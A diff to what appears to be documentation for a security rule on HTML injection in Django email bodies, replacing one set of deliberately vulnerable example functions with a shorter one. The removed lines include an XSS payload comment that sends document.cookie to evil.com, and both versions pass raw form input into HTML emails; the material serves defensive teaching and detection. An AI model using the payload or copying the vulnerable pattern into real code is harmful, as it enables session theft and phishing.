@@ -44,32 +44,22 @@ phishing pages, malware downloads, or credential-harvesting forms.
 
 VULNERABLE EXAMPLE:
 ```python
-from django.core.mail import send_mail, EmailMessage
+from django.core.mail import EmailMessage, send_mail
 
-def send_welcome(request):
-    # VULNERABLE: User input in HTML email body without sanitization
-    name = request.POST.get('name')
-    html_body = "<h1>Welcome, " + name + "!</h1><p>Thanks for joining.</p>"
-    send_mail(
-        'Welcome!',
-        'Welcome text',
-        'noreply@example.com',
-        [request.POST.get('email')],
-        html_message=html_body,
-    )
-    # Attack: name=<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">
 
-def send_notification(request):
-    # VULNERABLE: User input in EmailMessage body
-    message = request.POST.get('message')
-    email = EmailMessage(
-        'Notification',
-        '<div>' + message + '</div>',
-        'noreply@example.com',
-        ['admin@example.com'],
-    )
-    email.content_subtype = 'html'
+# SEC-060: XSS in email body
+def vulnerable_email(request):
+    body = request.POST.get('message')
+    email = EmailMessage("Subject", body, "from@test.com", ["to@test.com"])
+    email.content_subtype = "html"
     email.send()
+
+
+# SEC-061: XSS in send_mail html_message
+def vulnerable_sendmail(request):
+    content = request.POST.get('body')
+    send_mail("Subject", "text body", "from@test.com", ["to@test.com"],
+              html_message=content)
 ```
 
 SECURE EXAMPLE:
